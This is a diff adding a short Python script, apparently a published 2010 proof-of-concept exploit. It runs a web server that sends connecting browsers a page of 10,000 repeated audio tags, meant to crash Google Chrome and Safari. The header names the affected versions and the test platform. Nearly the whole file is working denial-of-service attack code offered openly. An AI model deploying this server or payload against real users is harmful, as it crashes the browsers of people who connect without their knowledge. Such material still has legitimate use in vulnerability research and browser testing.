@@ -1,0 +1,40 @@
+#!/usr/bin/python
+
+#Multiple Browsers Audio Tag Denial of Service Vulnerability
+#any ogg file can be used for the DoS as long as it is a valid file on the server
+#crash reporter for Mac seems to think this is a EXEC_BAD_ACCESS
+#This script acts as a web server to DoS connecting clients
+
+# Exploit Title: Multiple Browsers Audio Tag DoS Vulnerability
+# Date: April 21th, 2010
+# Author: Chase Higgins, http://twitter.com/tzDev
+# Software Link: google.com/chrome, apple.com/safari
+# Version: Google Chrome 5.0.375.9 dev
+# Tested on: Mac OSX 10.5.8
+ 
+import sys, socket;
+
+def main():
+	html = """
+	<html>
+	<body>
+	""";
+	
+	html += "<audio src='myogg.ogg'>" * 10000;
+	
+	html += """
+	</body>
+	</html>
+	""";
+	
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+	s.bind(('', 2121));
+	s.listen(1);
+	
+	while True:
+		channel, details = s.accept();
+		print channel.recv(256);
+		channel.send(html);
+		channel.close();
+	
+main();
